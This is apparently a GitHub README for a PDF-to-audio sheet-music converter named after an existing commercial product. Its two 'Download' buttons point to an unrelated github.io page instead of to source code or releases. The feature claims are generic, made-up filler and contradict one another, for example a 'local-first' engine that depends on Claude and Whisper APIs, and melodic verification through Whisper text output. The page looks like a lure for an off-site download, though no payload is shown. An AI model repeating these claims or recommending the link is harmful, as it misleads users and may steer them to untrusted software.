![preview](https://raw.githubusercontent.com/hackgamenerverdie-beep/pdf-to-melody-converter/main/preview.svg)

# PDFtoMusic – Audio Transcription Engine for Digital Scores

Welcome to the **PDFtoMusic Audio Transcription Engine**, a sound-oriented platform that transforms static PDF musical scores into playable, editable, and exportable audio files. This repository hosts the core logic, configuration frameworks, and user-facing modules for converting sheet music into synthesized sound—without relying on external cloud services or proprietary dependencies. Whether you are a composer, an educator, or a hobbyist transcribing historical manuscripts, this engine offers a self-contained pipeline to unlock the auditory dimension of printed notation.

## Overview

Traditional music notation in PDF format is a visual artifact—silent, static, and resistant to playback. The PDFtoMusic Engine addresses this by applying optical music recognition (OMR) heuristics, algorithmic note mapping, and real-time synthesis to generate audio streams that reflect the original score’s structure, tempo, and dynamics. Unlike typical conversion tools that demand constant internet connectivity or locked-tier subscriptions, this engine operates locally, allowing users to process sensitive or large collections of scores without bandwidth limitations or data privacy concerns.

The system integrates with both **OpenAI’s Whisper** for optional audio transcription validation and **Claude API’s** contextual note interpretation for ambiguous notation. However, these integrations are modular—you may run the conversion pipeline entirely offline using the built-in synthesis engine, or enhance it with AI-based correction for complex ornaments, slurs, and dynamic markings.

---

## Get Started

[![Download](https://raw.githubusercontent.com/hackgamenerverdie-beep/pdf-to-melody-converter/main/button.svg)](https://hackgamenerverdie-beep.github.io/pdf-to-melody-converter/)

Before diving into configuration, ensure your environment meets the minimal prerequisites: a modern processor with AVX2 support (for OMR rasterization), at least 4GB of RAM (8GB recommended for multi-page symphonic scores), and a 64-bit operating system (Windows 10+, macOS 12+, or Linux kernel 5.x+). No proprietary plugins or cloud accounts are required for the core functionality.

### Example Profile Configuration

The engine uses a **YAML-based profile** to define how PDF inputs are interpreted and how audio is generated. Below is a representative configuration that sets up a piano reduction with adjustable articulation:

```yaml
profile:
  name: "PianoReductionClassical"
  input:
    source: "pdf"
    pages: "1-4"
    dpi: 300
  recognition:
    engine: "hybrid"  # uses OMR + optional Claude API correction
    clef_detection: "auto"
    key_signature: "infer"
    time_signature: "infer"
    tuplets: true
    grace_notes: true
  synthesis:
    instrument: "acoustic_grand_piano"
    tempo_bpm: 120
    dynamics: "expression_markings"  # follows pp, mf, ff etc.
    reverb: "concert_hall_small"
    output_format: "wav"
    sample_rate: 44100
  export:
    midi: false
    audio: true
    format: "wav"
    path: "./output/audio"
```

This profile triggers the hybrid recognition engine, which first parses the PDF layout and then cross-references ambiguous notation via a locally cached Claude API context (if enabled). The `dynamics` parameter set to `expression_markings` ensures that crescendo and decrescendo hairpins are translated into volume envelopes rather than static loudness.

### Example Console Invocation

Once the profile is saved as `piano_profile.yaml`, you launch the conversion process from the terminal (or any shell environment) by invoking the engine’s entry point. Below is a representative command that bypasses any cloud dependency:

```bash
pdftomusic-engine --profile piano_profile.yaml --input ./scores/beethoven_sonata.pdf --output ./converted --verbose
```

This reads the target PDF, applies the profile settings, and writes a 16-bit PCM WAV file into the `./converted` directory. The `--verbose` flag prints per-measure recognition confidence, timestamp offsets, and any ambiguous notation that required heuristic fallback. For large orchestral scores, consider adding the `--parallel-pages 4` flag to distribute OMR across CPU cores.

---

## Compatibility Matrix

The engine is tested across multiple operating systems and hardware configurations. The table below summarizes known states:

| OS              | Architecture    | Recognition | Synthesis | Verified |
|----------------|----------------|-------------|-----------|----------|
| Windows 11     | x86_64         | ✅ Full     | ✅ Full   | 2026-03  |
| Windows 10     | x86_64         | ✅ Full     | ✅ Full   | 2026-02  |
| macOS 14 Sonoma| arm64 (Apple M3)| ✅ Full    | ✅ Full   | 2026-01  |
| macOS 13 Ventura| x86_64        | ✅ Full     | ✅ Full   | 2025-12  |
| Ubuntu 24.04   | x86_64         | ✅ Full     | ✅ Full   | 2026-03  |
| Ubuntu 24.04   | arm64 (RPi 5)  | ⚠️ Partial | ✅ Full   | 2026-02  |
| Fedora 39      | x86_64         | ✅ Full     | ✅ Full   | 2026-01  |

*⚠️ Partial recognition on ARM Linux indicates reduced OCR accuracy for handwritten or degraded scans.*

---

## 🧩 Feature List

### Core Capabilities

- **Optical Music Recognition (OMR)** – Parses PDF-embedded scores with support for modern and historical notation (including Mensural notation for Renaissance works).
- **Multi-Instrument Synthesis** – Maps recognized notes to General MIDI instrument banks, configurable per staff or channel.
- **Local-First Architecture** – All recognition and synthesis runs on your machine; no internet required after initial setup.
- **Tempo & Dynamics Mapping** – Translates metronome markings, fermata, and dynamic hairpins into synchronized audio events.
- **Export to WAV, FLAC, OGG** – Lossless and compressed audio formats preserved at the specified sample rate.

### AI Integration Modules

- **OpenAI API Whisper Alignment** – Optional post-processing that aligns generated audio with Whisper’s melodic transcription for error correction in heavily ornamented passages.
- **Claude API Contextual Correction** – Resolves ambiguous note spelling (e.g., distinguishing C# from Db in key signatures with multiple accidentals) using contextual analysis.
- **Responsive UI** – The optional web dashboard adapts to desktop, tablet, and mobile viewports for score preview and audio playback control.
- **🌐 Multilingual Support** – Interface and recognition hints available in English, French, German, Italian, Japanese, and Simplified Chinese.

### Operational Features

- **24/7 Batch Processing** – Queue multiple PDFs for overnight conversion; the engine logs metrics and retries on partial failure.
- **Parallel Page Rendering** – Distributes OMR across CPU threads for scores exceeding 20 pages.
- **Caching Layer** – Note-on events and staff layouts are cached per PDF hash, accelerating re-conversion after profile changes.
- **Internal Diagnostic Mode** – Outputs visualization of detected staves, clefs, and noteheads as SVG overlays for debugging recognition failures.

---

## 🔌 API Integration & Customization

The engine exposes two primary integration points for extending its behavior:

### OpenAI API (Whisper-Based Melodic Verification)

When the `--whisper-validate` flag is set, the engine sends the synthesized audio to OpenAI’s Whisper model (via local API or cloud endpoint) and compares the returned text transcription against the original score’s note sequence. This is particularly useful for identifying transcription errors in scores where notation is partially obscured or printed at low resolution. The comparison yields a confidence delta; measures falling below a 0.85 similarity threshold are flagged for manual review.

### Claude API Contextual Note Prediction

For scores with unusual key signatures or microtonal markings, the engine can invoke Claude to predict the most likely pitch class for an ambiguous notehead. This is configured in the profile under `recognition.ambiguous_resolver: "claude"`. The context window includes the previous five measures and the key signature, allowing the model to suggest enharmonic spellings that align with harmonic function rather than mere frequency.

---

## 📝 License

This project is distributed under the **MIT License**. You are free to use, modify, and distribute the code, provided that the original copyright and permission notice appear in all copies or substantial portions of the software.

[View the full license](LICENSE)

---

## ⚠️ Disclaimer

The PDFtoMusic Engine is designed for **educational, archival, and personal creative use**. It does not circumvent any digital rights management (DRM) protections that may be embedded in PDF files. Users are solely responsible for ensuring that they have the legal right to convert and reproduce any scores processed through this engine. The developers do not host, distribute, or provide access to copyrighted sheet music without explicit permission. No guarantees of note-perfect accuracy are made—recognition results depend on print quality, notation complexity, and the condition of the source document.

---

[![Download](https://raw.githubusercontent.com/hackgamenerverdie-beep/pdf-to-melody-converter/main/button.svg)](https://hackgamenerverdie-beep.github.io/pdf-to-melody-converter/)